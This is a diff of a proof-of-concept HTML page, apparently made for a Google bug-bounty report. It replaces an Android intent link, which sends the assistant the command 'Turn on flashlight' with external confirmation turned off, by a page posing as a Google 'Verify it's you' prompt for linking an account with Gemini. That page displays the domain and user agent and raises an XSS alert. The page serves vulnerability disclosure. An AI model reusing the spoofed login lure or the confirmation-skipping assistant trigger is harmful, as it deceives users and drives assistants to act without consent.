@@ -1,20 +1,108 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Device Verification</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Security Verification</title>
     <style>
-        body { font-family: Arial; text-align: center; margin-top: 50px; background: #222; color: white; }
-        .btn { background-color: #4285F4; color: white; padding: 15px 30px; text-decoration: none; font-size: 20px; border-radius: 5px; display: inline-block; margin-top: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
+        body { 
+            font-family: 'Roboto', Arial, sans-serif; 
+            text-align: center; 
+            padding: 50px 20px; 
+            background-color: #f8f9fa; 
+            margin: 0;
+        }
+        .container { 
+            background: white; 
+            padding: 30px; 
+            border-radius: 8px; 
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12); 
+            max-width: 400px; 
+            margin: 0 auto; 
+        }
+        .logo { 
+            font-size: 24px; 
+            font-weight: bold; 
+            color: #4285F4; 
+            margin-bottom: 20px; 
+        }
+        .warning { 
+            color: #202124; 
+            font-size: 18px;
+            font-weight: 500; 
+            margin-bottom: 15px; 
+        }
+        .description {
+            color: #5f6368;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+        .poc-box { 
+            text-align: left; 
+            background: #e8f0fe; 
+            padding: 15px; 
+            border-radius: 4px; 
+            font-family: monospace; 
+            font-size: 12px; 
+            margin-top: 20px; 
+            word-wrap: break-word;
+            border-left: 4px solid #1a73e8;
+        }
+        button { 
+            background: #1a73e8; 
+            color: white; 
+            border: none; 
+            padding: 10px 24px; 
+            border-radius: 4px; 
+            font-size: 14px; 
+            font-weight: 500;
+            cursor: pointer; 
+            margin-top: 10px; 
+        }
+        button:hover {
+            background: #1557b0;
+        }
     </style>
 </head>
 <body>
+    <div class="container">
+        <div class="logo">Google</div>
+        <div class="warning">Verify it's you</div>
+        <div class="description">
+            To continue linking your account with Gemini, please verify your session credentials.
+        </div>
 
-    <h2>Hardware Verification</h2>
-    <p>Click below to run a background diagnostic.</p>
-    
-    <a class="btn" href="intent://#Intent;action=android.intent.action.ASSIST;package=com.google.android.googlequicksearchbox;S.android.intent.extra.TEXT=Turn%20on%20flashlight;B.EXPECT_EXTERNAL_CONFIRMATION=false;end">
-        Run Diagnostic
-    </a>
+        <button onclick="triggerAlert()">Next</button>
 
+        <!-- Proof of Execution for the Google Triager -->
+        <div class="poc-box" id="poc-data">
+            <strong>[!] Exploit Execution Context</strong><br><br>
+            Loading environment data...
+        </div>
+    </div>
+
+    <script>
+        // Automatically dump the context when the page loads
+        window.onload = function() {
+            var pocData = document.getElementById('poc-data');
+            
+            // Check if we are running inside the Google App's WebView / Custom Tab
+            var isGoogleApp = navigator.userAgent.indexOf("GSA") > -1;
+            var contextWarning = isGoogleApp ? 
+                "<span style='color: #d93025; font-weight: bold;'>GSA Environment Detected!</span><br><br>" : "";
+
+            pocData.innerHTML = "<strong>[!] Exploit Execution Context</strong><br><br>" +
+                                contextWarning +
+                                "<strong>Domain:</strong> " + document.domain + "<br><br>" +
+                                "<strong>User-Agent:</strong> " + navigator.userAgent + "<br><br>" +
+                                "<strong>Loaded URL:</strong> " + window.location.href;
+        };
+
+        // Standard XSS alert
+        function triggerAlert() {
+            alert("XSS Proof of Concept executed on: " + document.domain + "\n\nThis demonstrates Arbitrary URL loading inside the Google App Account Linking flow.");
+        }
+    </script>
 </body>
 </html>
